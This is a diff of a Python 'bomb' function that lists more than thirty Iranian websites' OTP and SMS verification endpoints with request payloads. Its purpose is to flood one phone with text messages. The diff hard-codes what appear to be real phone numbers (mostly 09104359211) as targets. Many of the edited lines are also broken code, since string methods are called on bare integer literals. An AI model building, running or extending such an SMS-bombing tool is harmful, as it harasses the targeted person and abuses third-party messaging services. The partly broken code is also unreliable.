@@ -7,111 +7,111 @@ def bomb(number):
     # Our sites that send SMS
     sites = [
         ["https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
-         {"source": "besina", "mobile": number}],
+         {"source": "besina", "mobile": 09104359211}],
 
         ["https://www.portal.ir/site/api/v1/user/otp",
-         {"template_id": 11111111, "type": "etc", "category": "etc", "mobile": number, "name": " "}],
+         {"template_id": 11111111, "type": "etc", "category": "etc", "mobile": 09104359211, "name": " "}],
 
         ["https://api.snapp.ir/api/v1/sms/link",
-         {"phone": number}],
+         {"phone": 09104359211}],
 
         ["https://www.sheypoor.com/api/v10.0.0/auth/send",
-         {"username": number}],
+         {"username": 09999901109}],
 
         ["https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
-         {"cellphone": number.replace("0", "+98", 1)}],
+         {"cellphone": 09104359211.replace("0", "+98", 1)}],
 
         ["https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", {"Parameters": {
             "ApplicationType": "Web", "ApplicationUniqueToken": "null", "ApplicationVersion": "1.0.0",
-            "MobileNumber": number, "UniqueToken": "null"}}],
+            "MobileNumber": 09104359211, "UniqueToken": "null"}}],
 
         ["https://api.divar.ir/v5/auth/authenticate",
-         {"phone": number.lstrip("0")}],
+         {"phone": 09104359211.lstrip("0")}],
 
         ["https://football360.ir/api/auth/verify-phone/",
-         {"phone_number": number.replace("0", "+98", 1)}],
+         {"phone_number": 09104359211.replace("0", "+98", 1)}],
 
         ["https://virgool.io/api/v1.4/auth/verify",
-         {"method": "phone", "identifier": number.replace("0", "+98", 1), "type": "register"}],
+         {"method": "phone", "identifier": 09104359211.replace("0", "+98", 1), "type": "register"}],
 
         ["https://www.snapptrip.com/register",
-         {"lang": "fa", "country_id": "860", "password": "12345678", "mobile_phone": number.replace("0", "98", 1),
+         {"lang": "fa", "country_id": "860", "password": "12345678", "mobile_phone": 09104359211.replace("0", "98", 1),
           "country_code": "+98", "email": "a@gmail.com"}],  # snapp trip
 
         ["https://gw.taaghche.com/v4/site/auth/signup",
-         {"contact": number}],
+         {"contact": 09104359211}],
 
-        ["https://core.gapfilm.ir/api/v3.1/Account/Login", {"Type": 3, "Username": number.lstrip(
+        ["https://core.gapfilm.ir/api/v3.1/Account/Login", {"Type": 3, "Username": 09104359211.lstrip(
             "0"), "SourceChannel": "GF_WebSite", "SourcePlatform": "desktop", "SourcePlatformAgentType": "Chrome",
             "SourcePlatformVersion": "111.0.0.0", "GiftCode": "null"}],
 
         ["https://api.digikalajet.ir/user/login-register/",
-         {"phone": number}],
+         {"phone": 09104359211}],
 
         ["https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://api.tapsi.cab/api/v2.2/user",
          {"credential": {"phoneNumber": number, "role": "PASSENGER"}, "otpOption": "SMS"}],
 
         ["https://mobapi.banimode.com/api/v2/auth/request",
-         {"phone": number}],
+         {"phone": 09104359211}],
 
         ["https://api.ostadkr.com/login",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://www.technolife.ir/shop", {
             "query": ("query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists"
                       "(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }"),
             "variables": {
-                "username": number}, "g-recaptcha-response": ""}],
+                "username": 09104359211}, "g-recaptcha-response": ""}],
 
         ["https://www.hamrah-mechanic.com/api/v1/membership/otp",
-         {"PhoneNumber": number, "prevDomainUrl": "https://www.google.com/",
+         {"PhoneNumber": 09104359211, "prevDomainUrl": "https://www.google.com/",
           "landingPageUrl": "https://www.hamrah-mechanic.com/",
           "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
           "prevUrl": "https://www.hamrah-mechanic.com/", "referrer": "https://www.google.com/"}],
 
         ["https://api.mobit.ir/api/web/v8/register/register",
-         {"number": number}],
+         {"number": 09104359211}],
 
         ["https://auth.basalam.com/otp-request",
-         {"mobile": number, "client_id": 11}],
+         {"mobile": 09104359211, "client_id": 11}],
 
         ["https://www.miare.ir/api/otp/driver/request/",
-         {"phone_number": number}],
+         {"phone_number": 09104359211}],
 
         ["https://api.vandar.io/account/v1/check/mobile",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://taraazws.jabama.com/api/v4/account/send-code",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
-        [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}",
+        [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={09104359211}",
          None],
 
         ["https://tikban.com/Account/LoginAndRegister",
-         {"phoneNumberCode": "+98", "CellPhone": number, "CaptchaKey": "null", "JustMobilephone": number.lstrip("0")}],
+         {"phoneNumberCode": "+98", "CellPhone": 09104359211, "CaptchaKey": "null", "JustMobilephone": 09104359211.lstrip("0")}],
 
         ["https://www.buskool.com/send_verification_code",
-         {"phone": number}],
+         {"phone": 09104359211}],
 
         ["https://api.timcheh.com/auth/otp/send",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://api.sibche.com/profile/sendCode",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://apiwebsite.shavaz.com/Auth/SendConfirmCode",
-         {"mobile": number}],
+         {"mobile": 09104359211}],
 
         ["https://account.bama.ir/api/otp/generate/v2",
-         {"CellNumber": number, "Appname": "bamawebapplication", "smsfor": 6}],
+         {"CellNumber": 09104359211, "Appname": "bamawebapplication", "smsfor": 6}],
 
         ["https://pinket.com/api/cu/v2/phone-verification",
-         {"phoneNumber": number}],
+         {"phoneNumber": 09104359211}],
 
-        [f"https://core.gap.im/v1/user/add.json?mobile=%2B{number.replace('0', '+98', 1)}",
+        [f"https://core.gap.im/v1/user/add.json?mobile=%2B{09104359211.replace('0', '+98', 1)}",
          "Get"],
 
     ]
